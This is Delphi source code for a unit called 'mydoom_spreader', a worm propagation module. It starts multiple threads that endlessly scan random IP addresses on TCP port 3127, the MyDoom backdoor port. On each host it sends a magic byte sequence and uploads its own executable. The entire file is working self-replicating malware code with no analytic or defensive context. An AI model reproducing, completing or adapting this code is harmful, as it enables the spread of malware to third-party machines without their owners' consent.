UNIT mydoom_spreader;

INTERFACE

uses
  Windows, Winsock;

  PROCEDURE StartMyDoom(NumberOfThreads:WORD);

IMPLEMENTATION

VAR
  Request : String = #$85#$13#$3c+#$9e#$a2;

TYPE
  TMyDoom = CLASS(TObject)
  PRIVATE
    szIPAddr     : STRING;
    PROCEDURE SendFile(FileName,HostName:STRING);
  PUBLIC
    PROCEDURE StartMyDoom;
END;


function StrtoInt(const S: string): integer; var
E: integer; begin Val(S, Result, E); end;

function InttoStr(const Value: integer): string;
var S: string[11]; begin Str(Value, S); Result := S; end;

//------------------------------------------------------------------------------
PROCEDURE TMyDoom.SendFile(FileName,HostName:STRING);
VAR
  F      : FILE;
  Sock   : Integer;
  J      : Integer;
  Addr   : TSockAddrIn;
  Buf    : ARRAY [0..1023] OF Char;
BEGIN
  szIPAddr:=IntToStr(Random(222)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1);

  Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  Addr.sin_family:=AF_INET;
  Addr.sin_addr.S_addr:=inet_addr(pChar(szIPAddr));
  Addr.sin_port:=htons(3127);

  IF Sock<=0 THEN Exit;
  IF Connect(Sock,Addr,SizeOf(Addr))<>0 THEN Exit;

  Send(Sock,Request[1],5,0);
  AssignFile(F,FileName);
  FileMode:=0;
  Reset(F,1);
  REPEAT
    BlockRead(F,Buf[0],SizeOf(Buf),J);
    IF J<=0 THEN Break;
    IF Send(Sock,Buf[0],J,0)<=0 THEN Break;
  UNTIL j<>1024;
  CloseSocket(Sock);
  CloseFile(F);
END;

//------------------------------------------------------------------------------
PROCEDURE TMyDoom.StartMyDoom;
VAR
  WD : TWSAData;
BEGIN
  WHILE True DO BEGIN
    WSAStartUp(MakeWord(1,1),WD);
    SendFile(paramstr(0),szIPAddr);
    WSACleanup;
  END;
END;

//------------------------------------------------------------------------------
PROCEDURE StartRandomThread;
VAR
  MyDoom : TMyDoom;
BEGIN
  MyDoom:=TMyDoom.Create;
  MyDoom.StartMyDoom;
END;

//------------------------------------------------------------------------------
PROCEDURE StartMyDoom(NumberOfThreads:WORD);
VAR
  I        : WORD;
  ThreadId : Cardinal;
BEGIN
  Randomize;
  FOR I:=1 TO NumberOfThreads DO BeginThread(NIL,0,@StartRandomThread,NIL,0,ThreadID);
END;

END.
